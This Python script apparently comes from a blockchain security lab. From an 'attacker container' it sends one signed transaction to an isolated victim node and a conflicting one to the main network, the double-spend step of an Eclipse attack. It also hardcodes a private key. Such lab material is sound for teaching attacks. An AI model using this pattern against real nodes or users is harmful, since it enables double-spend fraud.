#!/usr/bin/env python3
"""Container-friendly Eclipse attack transaction sender.

This script is intended to run from inside the attacker container
(as162h-new_eth_node-10.162.0.74) and connects directly to the node
RPC endpoints by IP.

If required packages are missing, it will attempt to install them using pip.
"""

import argparse
import importlib.util
import subprocess
import sys
import time

TX_CONFIG = {
    "fake": {
        "rpc": "http://10.162.0.71:8545",
        "to": "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9",
        "value_eth": 5,
        "description": "Fake transaction to the isolated victim node",
    },
    "real": {
        "rpc": "http://10.161.0.71:8545",
        "to": "0xaB5AaD8284868B91Eb537d28aB1A159740D54890",
        "value_eth": 1,
        "description": "Real transaction to the main network safe address",
    },
}
PRIVATE_KEY = "e128a6b87aa1d934970fd0f2714dd2fe61c017636725dbfeb5e487cc83bcb7eb"
CHAIN_ID = 1337
DEFAULT_GAS = 200000
DEFAULT_MAX_FEE_GWEI = 4
DEFAULT_MAX_PRIORITY_FEE_GWEI = 3


def ensure_package(module_name, pip_name=None):
    pip_name = pip_name or module_name
    if importlib.util.find_spec(module_name) is not None:
        return

    print(f"[*] Installing required Python package: {pip_name}")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-cache-dir", pip_name])


def ensure_dependencies():
    ensure_package("web3")
    ensure_package("eth_account")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Send Eclipse attack transactions from inside the attacker container",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--type",
        choices=["fake", "real"],
        default="fake",
        help="Which transaction to send",
    )
    parser.add_argument(
        "--rpc",
        help="Override the target RPC endpoint",
    )
    parser.add_argument(
        "--value",
        type=float,
        help="Override the ETH value to send",
    )
    parser.add_argument(
        "--to",
        help="Override the recipient address",
    )
    parser.add_argument(
        "--no-wait",
        action="store_true",
        help="Do not wait for transaction receipt",
    )
    parser.add_argument(
        "--skip-install",
        action="store_true",
        help="Do not attempt to install missing Python packages",
    )
    return parser.parse_args()


def build_transaction(web3, sender_addr, recipient, value_eth):
    from web3 import Web3
    nonce = web3.eth.get_transaction_count(sender_addr)
    return {
        "chainId": CHAIN_ID,
        "nonce": nonce,
        "from": sender_addr,
        "to": Web3.to_checksum_address(recipient),
        "value": Web3.to_wei(value_eth, "ether"),
        "gas": DEFAULT_GAS,
        "maxFeePerGas": Web3.to_wei(DEFAULT_MAX_FEE_GWEI, "gwei"),
        "maxPriorityFeePerGas": Web3.to_wei(DEFAULT_MAX_PRIORITY_FEE_GWEI, "gwei"),
        "data": b"",
    }


def main():
    args = parse_args()
    if not args.skip_install:
        ensure_dependencies()

    from eth_account import Account
    from web3 import Web3

    config = TX_CONFIG[args.type]
    rpc_endpoint = args.rpc or config["rpc"]
    recipient = args.to or config["to"]
    value_eth = args.value if args.value is not None else config["value_eth"]

    web3 = Web3(Web3.HTTPProvider(rpc_endpoint))
    if not web3.is_connected():
        print(f"ERROR: Cannot connect to RPC endpoint: {rpc_endpoint}")
        sys.exit(1)

    sender = Account.from_key(PRIVATE_KEY)
    print(f"[*] Attacker address: {sender.address}")
    print(f"[*] Target RPC: {rpc_endpoint}")
    print(f"[*] Recipient: {recipient}")
    print(f"[*] Value: {value_eth} ETH")
    print(f"[*] Description: {config['description']}")

    tx = build_transaction(web3, sender.address, recipient, value_eth)
    print(f"[*] Signing {args.type} transaction with nonce {tx['nonce']}")
    signed = web3.eth.account.sign_transaction(tx, sender.key)
    tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)

    tx_hash_hex = tx_hash.hex() if hasattr(tx_hash, "hex") else tx_hash
    print(f"[+] Sent transaction: {tx_hash_hex}")

    if not args.no_wait:
        timeout = 300
        print(f"[*] Waiting for receipt (timeout={timeout}s)")
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=timeout)
        print(f"[+] Receipt: block {receipt['blockNumber']}, status {receipt['status']}")
    else:
        print("[*] Exiting without waiting for receipt")


if __name__ == "__main__":
    main()
